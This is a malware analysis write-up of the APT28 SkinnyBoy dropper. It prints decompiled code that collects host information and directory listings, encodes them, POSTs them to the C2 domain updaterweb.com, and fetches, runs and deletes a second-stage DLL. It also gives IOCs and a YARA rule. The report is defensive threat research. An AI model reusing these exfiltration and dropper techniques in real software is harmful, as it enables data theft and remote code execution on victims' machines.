---
title: The light weight APT28 skinny-boy dropper
date: 2026-01-10 00:00:00 +0300
categories: [malware analysis,APT]
tags: [apt28, sofacy, skinnyboy, reverse-engineering, threat-intel]
render_with_liquid: false
---

This is a malware analysis report of an old malware, used by APT28/Sofacy. It acts on 3 different stages: SkinnyBoy dropper, SkinnyBoy launcher and SkinnyBoy implant. This report is for the dropper stage.

## Executive summary

This malware is a 32 bit DLL, that first harvests victim host information using `systeminfo.exe`, also the list of all running processes using `tasklist.exe`, and enumerates certain crucial windows directories (like the Program Files, Admin Tools, etc.) for files and directory names, then encodes the results by base64, and POSTs it to the C2 server. Finally, it receives a POST reply, which contains another DLL that will be dropped to `%TEMP%` (this DLL might be for process injection, given the previously exfiltrated info about the running processes, or it could be a data stealer targeted for certain files, given the previously exfiltrated info about all files in certain locations), then the malware runs this DLL, and again, sends the results back to C2.

## Technical analysis

The DLL exports only one function , `DllMod` :

![DLL exports as shown by CFF explorer](/resources/skinnyboy-rsrcs/1_C8JNM0tGSsv0W-jMdqc9Lw.png)
_DLL exports as shown by CFF explorer_

Statically analyzing this function, we see:

```c
hEvent = CreateEventW(0, 0, 0, 0);
Thread = CreateThread(0, 0, DataHarvester, 0, 0, 0);
hThread = CreateThread(0, 0, MainMalwareDropper, 0, 0, 0);
MessageLoop();
ExitCode = 0;
SetEvent(hEvent);
GetExitCodeThread(Thread, &ExitCode);
GetExitCodeThread(hThread, &ExitCode);
CloseHandle(Thread);
return CloseHandle(hThread);
```

First , it creates an unsignaled event object, which will be used to halt `MainMalwareLoader` until the `DataHarvester` thread finishes.

Then , after creating the threads, the malware enters a message loop function; this is mainly used to make sure that the main thread won't terminate before other threads finish.

Finally, it resets the event object back to unsignaled state , closes the handles, and quits .

### Analysis of DataHarvesterThread

Firstly, it calls:

```c
ExecuteCommandPassed("systeminfo", &PointerToHeapCollective, &NumberOfBytesRead);
```

which is used to execute `systeminfo.exe`, and read the results back to a heap allocated block.

```c
PipeAttributes.nLength = 12;
PipeAttributes.lpSecurityDescriptor = 0;
PipeAttributes.bInheritHandle = 1;
if ( !CreatePipe(&hReadPipe, &hWritePipe, &PipeAttributes, 0x19000u) )
    return 0;
strcpy_s(CommandLine, 0x19000u, Source);
```

It will do that by utilizing parent-child process communication, so it will create an anonymous pipe with inheritable handles. Later:

```c
StartupInfo.cb = 68;
GetStartupInfoA(&StartupInfo);
StartupInfo.hStdError = hWritePipe;
StartupInfo.hStdOutput = hWritePipe;
StartupInfo.hStdInput = hReadPipe;
StartupInfo.wShowWindow = 0;
StartupInfo.lpTitle = "CMD";
StartupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
```

This changes the later created process's stdout/in/err handles to use the pipe handles; this means that, when the process is created, it will write the stdout/err using `hWritePipe`, and we will read them from the pipe using `ReadFile(hReadPipe,….)`.

```c
if ( !CreateProcessA(0, CommandLine, 0, 0, 1, 0, 0, 0, &StartupInfo, &ProcessInformation) )
{
    CloseHandle(hWritePipe);
    CloseHandle(hReadPipe);
    return 0;
}
WaitForSingleObject(ProcessInformation.hProcess, 0x927C0u);
```

Here, it executes the program by creating a process for it, and then it waits until it finishes.

Finally, it reads the result of the program, using `ReadFile`:

```c
FileSize_2 = FileSize;
ProcessHeap = GetProcessHeap();
lpBuffer = HeapAlloc(ProcessHeap, HEAP_ZERO_MEMORY, FileSize_2);
hReadPipe_1 = hReadPipe;
*p_Size = lpBuffer;
ReadFile(hReadPipe_1, lpBuffer, FileSize_1, lpNumberOfBytesRead, 0);
```

Now:

```c
ExecuteCommandPassed("tasklist", &Size, &lpNumberOfBytesRead_);
```

This function does the same, but now executing `tasklist.exe`.

```c
ExfiltrateDirectoryContents((const void **)&PointerToheapBase, &SizeOfHeap, 0);
ExfiltrateDirectoryContents((const void **)&PointerToheapBase, &SizeOfHeap, 38);
ExfiltrateDirectoryContents((const void **)&PointerToheapBase, &SizeOfHeap, 42);
ExfiltrateDirectoryContents((const void **)&PointerToheapBase, &SizeOfHeap, 48);
ExfiltrateDirectoryContents((const void **)&PointerToheapBase, &SizeOfHeap, 26);
ExfiltrateDirectoryContents((const void **)&PointerToheapBase, &SizeOfHeap, 21);
ExfiltrateDirectoryContents((const void **)&PointerToheapBase, &SizeOfHeap, 36);
ExfiltrateDirectoryContents((const void **)&PointerToheapBase, &SizeOfHeap, 999);
```

Here, it does the file enumeration, sending the target path as a `FOLDERID` (formerly known as `CSIDL`, which is a numerical value that represents special Windows folders, i.e. `CSIDL_PROGRAMFILES`).

```c
// ExfiltrateDirectoryContents:
if ( csidl == 38 )
{
    lstrcatW(pszPath, L"C:\\Program Files");
}
else if ( csidl == 999 )
{
    GetTempPathW(0x104u, pszPath);
}
else
{
    SHGetFolderPathW(0, csidl, 0, 0, pszPath);
}
```

Here, if the sent CSIDL is 999, it will use `GetTempPathW()` to get the path to the TEMP directory, and if 38, it will get the Program Files path, otherwise, it will use `SHGetFolderPathW()` to get the path associated with the CSIDL.

Next, using `FindFirstFile()` and `FindNextFileW()`, the target folder will be enumerated, and all names of files/dirs will be copied to a heap block as such:

```
######pathoftargetsystemfoler#########
file1/dir1
file2/dir2
file3/dir2
....
```

**Directories scrapped:**

- Desktop folder
- `C:\Program Files`
- `C:\Program Files (x86)`
- `C:\Users\<User>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Administrative Tools`
- `C:\Users\<User>\AppData\Roaming`
- `C:\Users\<User>\AppData\Roaming\Microsoft\Windows\Templates`
- `C:\WINDOWS`
- `C:\Users\<User>\AppData\Local\Temp`

```c
MergeDataToOneHeap((const void **)&PointerToHeapCollective, &Size, (int)SizeOfHeapCollective);

ExfiltrateToC2server(L"updaterweb.com", (char *)PointerToHeapCollective, Size);
```

The first function merges all results of the previous exfiltration into one heap block.

The second block exfiltrates the data to the C2 server using HTTPS:

```c
// ExfiltrateToC2server:
InternetOpenW(L"Opera", INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, 0);
```

This initiates the use of WinINet functions, using  **Opera** as user agent .

```c
Buffer = 600000;
InternetSetOptionW(hInternet_1, INTERNET_OPTION_RECEIVE_TIMEOUT, &Buffer, 4u);
InternetSetOptionW(hInternet_1, INTERNET_OPTION_SEND_TIMEOUT, &Buffer, 4u);
```

This changes the timeout of the requests and responses of HTTP.

```c
hInternet_2 = InternetConnectW(
                    hInternet_1,
                    lpszServerName,
                    INTERNET_DEFAULT_HTTPS_PORT,
                    0,
                    0,
                    INTERNET_SERVICE_HTTP,
                    0,
                    1u);
```

This initiates an HTTPS session, to `updaterweb.com`.

```c
InternetConnectW(
                    hInternet_3,
                    lpszServerName,
                    INTERNET_DEFAULT_HTTP_PORT,
                    0,
                    0,
                    INTERNET_SERVICE_HTTP,
                    0,
                    1u);

// Alternately, if HTTPS won't work, it uses HTTP
```

```c
ExtractSysteminfo(){
GetComputerNameA(Buffer, &nSize);
memset(lpBuffer, 0, sizeof(lpBuffer));
nSize = 260;
GetUserNameA(lpBuffer, &nSize);
VolumeSerialNumber = 0;
GetVolumeInformationW(0, 0, 0, &VolumeSerialNumber, 0, 0, 0, 0);
```

This function retrieves the hostname of the device, with the current logged in username, and finally retrieves the volume serial number.

```c
n1258358309 = 0x4B010625;
n357387799 = 0x154D4E17;
n257758298 = 0xF5D145A;
n20 = 20;
memset(v22, 0, sizeof(v22));
strcpy(xorKey1, "CEJ&V%$84k839y92m");
memset(&xorKey1[18], 0, 0x6Eu);
i_1 = lstrlenA(Format_1);
for ( i = 0; i < i_1; ++i )
    Format_1[i] ^= xorKey1[i];
```

This is one of two encoding functions, which encodes a very important format: `id=%s#%s#%u&cmd=y`.

```c
*(_DWORD *)Format = 1246172184;
n442322450 = 442322450;
n1393642310 = 1393642310;
n268834565 = 268834565;
n509172995 = 509172995;
n1142053121 = 1142053121;
n470745609 = 470745609;
n1646488138 = 1646488138;
n387908883 = 387908883;
n83 = 83;
memset(v33, 0, sizeof(v33));
strcpy(xorKey2, "qpzoamxiendufbtbf3-#$*40fvnpwOPDwdkvn");
memset(&xorKey2[38], 0, 0x5Au);
j_1 = lstrlenA(Format);
for ( j = 0; j < j_1; ++j )
    Format[j] ^= xorKey2[j];
```

The second encoding function encodes: `id=%s#%s#%u&current=%s&total=%s&data=`.

The above two formats will be used with `vsnprintf_s()`, to format the hostname, username, and the volume serial number.

These are, in fact, the commands that will be posted to the C2 server.

**Back to the exfiltrator function:**

```c
if ( CryptBinaryToStringA((const BYTE *)Buffer_1, n0x200000, CRYPT_STRING_BASE64, 0, &pcchString) )
{
    pcchString_1 = pcchString;
    hHeap = GetProcessHeap();
    pszString = (CHAR *)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, pcchString_1);
    n0x200000_2 = n0x200000;
    Buffer_2 = (void *)Buffer;
    CryptBinaryToStringA((const BYTE *)Buffer, n0x200000_2, CRYPT_STRING_BASE64, pszString, &pcchString);
    hHeap_1 = GetProcessHeap();
    HeapFree(hHeap_1, 0, Buffer_2);
    n0x200000 = pcchString;
    Buffer = (int)pszString;
}
```

This encodes the exfiltrated data using base64.

Finally:

```c
sub_70B91E40((int)encodedData, dwNumberOfBytesToWrite, v36)
```

First, construct the POST request:

```c
HttpOpenRequestW(hConnect, L"POST", 0, 0, 0, 0, INTERNET_FLAG_SECURE, 1u);
```

The following format is used:

`id=%s#%s#%u&cmd=y` (which, as we will see next, will command the server to send a DLL, which will be dropped in the TEMP directory).

**Final HTTP request looks like:**

```http
POST / HTTP/1.1
User-Agent: Opera
Host: updaterweb.com
Content-Length: 42
Cache-Control: no-cache

id=DESKTOP-9N5QDPH#hussam#4130909264&cmd=y
[BASE64 exfiltrated data
.....]
```

Now, sending the request with additional data:

```c
lstrcatW(lpString1, L"Content-Type: ");
lstrcatW(lpString1, L"application/x-www");
lstrcatW(lpString1, L"-form-urlencoded");
HttpAddRequestHeadersW(*(HINTERNET *)(Hinternet + 8), lpString1, 3u, HTTP_QUERY_FLAG_NUMBER | 0x80000000);
if ( HttpSendRequestExW(*(HINTERNET *)(Hinternet + 8), &BuffersIn, 0, 0, 0)
  && !InternetWriteFile(*(HINTERNET *)(Hinternet + 8), lpBuffer, dwNumberOfBytesToWrite, &dwNumberOfBytesWritten) )
```

`HttpAddRequestHeadersW` adds the Content-Type header to the POST request, then `HttpSendRequestExW` sends the actual request, finally using `InternetWriteFile` to add the exfiltrated data to the request.

> Note: if HTTPS doesn't work, the malware will use HTTP as a fallback to guarantee that data will reach the C2.
{: .prompt-info }

Finishing the first thread, it will do the following:

```c
ProcessHeap = GetProcessHeap();
HeapFree(ProcessHeap, 0, Size_2);
hHeap = GetProcessHeap();
HeapFree(hHeap, 0, Size_3);
PointerToheapBase_1 = PointerToheapBase;
hHeap_1 = GetProcessHeap();
HeapFree(hHeap_1, 0, PointerToheapBase_1);
SetEvent(hEvent);
```

What we are interested in is `SetEvent(hEvent)`, which will set the event object to signaled, and now thread 2 will resume its execution.

### Thread2 : MainMalwareDropper

```c
WaitForSingleObject(hEvent, 0xFFFFFFFF); // will return when the event is signaled
ResetEvent(hEvent);
do {

ReadReplyContent(&ReplyData, ReplyDataSize);
```

**`ReadReplyContent()`:**

```c
InternetQueryDataAvailable(hFile, &Buffer, 0, 0);
```

This function checks if there is available data as a response, then using:

```c
ReadPostReply(&hInternet, (void **)PointerToReadData, a2);
```

We read this reply data; this reply is encoded in base64, so the malware decodes it back to binary using `CryptStringToBinaryA()`.

After reading the reply data, the data is in the following format:

```
datasize
32 byte SHA-256 hash of the binary
binary data (DLL to drop)
```

```c
if ( CryptAcquireContextA(&phProv, 0, 0, 0x18u, CRYPT_VERIFYCONTEXT) )
{
    GetLastError();
    CryptCreateHash(phProv, CALG_SHA_256, 0, 0, &phHash);
    GetLastError();
    CryptHashData(phHash, (const BYTE *)pbData, dwDataLen, 0);
    GetLastError();
    pdwDataLen = 260;
    CryptGetHashParam(phHash, HP_HASHVAL, SentBinary, &pdwDataLen, 0);
    CryptDestroyHash(phHash);
    CryptReleaseContext(phProv, 0);
    pdwDataLen_1 = pdwDataLen;
}
```

The above code first calls `CryptAcquireContextA()` to get a handle to a CSP (cryptographic service provider) with access to digital signature functions.

`CryptCreateHash()` creates a SHA-256 hash object, then using `CryptGetHashParam()` the SHA-256 hash of the sent DLL is retrieved.

```c
if ( *targetHash == *SentBinary
    && (n4 == -3
     || targetHash[1] == SentBinary[1]
     && (n4 == -2 || targetHash[2] == SentBinary[2] && (n4 == -1 || targetHash[3] == SentBinary[3]))) )
{
LABEL_18:
    GetTempPathW(0x104u, Buffer);
    PathAddBackslashW(Buffer);
    lstrcatW(Buffer, L"fvjoik.dll");
```

Firstly, the malware compares the first 4 bytes of the hash with the predetermined hash, and if equal, it will call `GetTempPathW(0x104u, Buffer)` to get the path to the TEMP folder, where the DLL (`fvjoik.dll`) will be dropped.

```c
FileW = CreateFileW(Buffer, GENERIC_WRITE, FILE_WRITE_DATA, 0, OPEN_ALWAYS, FILE_READ_ATTRIBUTES, 0);
LastError = GetLastError();
if ( FileW != (HANDLE)-1 )
{
    if ( LastError == ERROR_ALREADY_EXISTS )
    {
        SetFilePointer(FileW, 0, 0, FILE_BEGIN);
        goto LABEL_23;
    }
```

Now, we create a file in TEMP, and if it already exists there, `SetFilePointer` moves the file pointer to the beginning (so `WriteFile` will overwrite the original one).

```c
WriteFile(FileW, pbData, dwDataLen, &phProv, 0);
CloseHandle(FileW);
SetFileAttributesW(Buffer, FILE_READ_ATTRIBUTES);
```

This writes the received DLL to the target path, and sets it to read-only.

```c
if ( PathFileExistsW(Buffer) )
{
    hModule = LoadLibraryW(Buffer);
    dword_70BA1B20 = (int)GetProcAddress(hModule, (LPCSTR)1);
    Size = ((int (__stdcall *)(char **))dword_70BA1B20)(&result);
    FreeLibrary(hModule);
}

DeleteDroppedFile();
```

Now, after successful dropping, the malware loads the DLL into the current process, and then retrieves the function with ordinal 1.

It then calls it, and the result will be stored in the `result` parameter.

`DeleteDroppedFile()` uses `WinExec` to execute the following command :

```
cmd /c DEL PATHToDroppedFile
```

which deletes the dropped file after execution, to cover its traces.

```c
if ( Size )
    ExfiltrateToC2server(L"updaterweb.com", Value, Size);
```

Here, the result of executing the dropped DLL will be exfiltrated to the same C2 server (we've already covered this function above).

```c
while ( WaitForSingleObject(hEvent, 0x6DDD00u) );
```

> Note: after thread 1 has signaled the event object, it was set back to unsignaled in this thread; this means that this function will be blocked until the event is signaled again.
{: .prompt-info }

**Implication:** This dangerous function will remain running, and the attacker can potentially drop more malware later.

Wrapping up this analysis, in the main thread:

```c
MessageLoop();
ExitCode = 0;
SetEvent(hEvent);
GetExitCodeThread(Thread, &ExitCode);
GetExitCodeThread(hThread, &ExitCode);
CloseHandle(Thread);
return CloseHandle(hThread);
```

This ensures that the malware keeps running continuously  , adding the ability to recieve and drop  more payloads .

## Indicators of compromise

### Host based indicators

**A. Strings:** `systeminfo`, `tasklist`

**Importance:** these are the programs used by the malware to get system information, and the list of all running processes (which may facilitate process injection later).

**B. Hardcoded path:** `C:\Program Files`

**C. XOR keys:** `CEJ&V%$84k839y92m` and `qpzoamxiendufbtbf3-#$*40fvnpwOPDwdkvn`, used to decode important format strings.

**D. Path:** `C:\Users\<username>\AppData\Local\Temp`

**Importance:** the malware drops `fvjoik.dll` to this path, but deletes it after execution.

### Network based IOCs

**Domain name:** `updaterweb.com`

**Importance:** this is the C2 server domain, used to receive exfiltrated data, and send dropping agents.

### Simple YARA detection rule

```yara
rule skinny_boy{
    meta:
        description="This rule is used to detect APT28/Sofacy skinny boy malware"
        author="Hussam aljaar"
    strings:
        $domain="updaterweb.com" ascii wide nocase
        $xorKey1="CEJ&V%$84k839y92m" ascii wide nocase
        $xorKey2="qpzoamxiendufbtbf3-#$*40fvnpwOPDwdkvn" ascii wide nocase
        $path1="C:\\Program Files" ascii wide nocase
        $webAgent="Opera" ascii wide nocase
        $dllName="fvjoik.dll" ascii wide nocase
        $process1="systeminfo" ascii wide nocase
        $process2="tasklist" ascii wide nocase
    condition:
        uint32(uint32(0x3c)) and
        (
            any of them
        )
}
```

**That's it , hope you enjoyed and learned something new.** For anybody who wants to learn more about some of the mentioned concepts:

- What are message loops? [winprog.org/tutorial/message_loop.html](https://winprog.org/tutorial/message_loop.html)
- Event objects: [learn.microsoft.com/.../sync/event-objects](https://learn.microsoft.com/en-us/windows/win32/sync/event-objects)
- What are droppers: [youtube.com/watch?v=wTh33KjeAnss](https://www.youtube.com/watch?v=wTh33KjeAnss)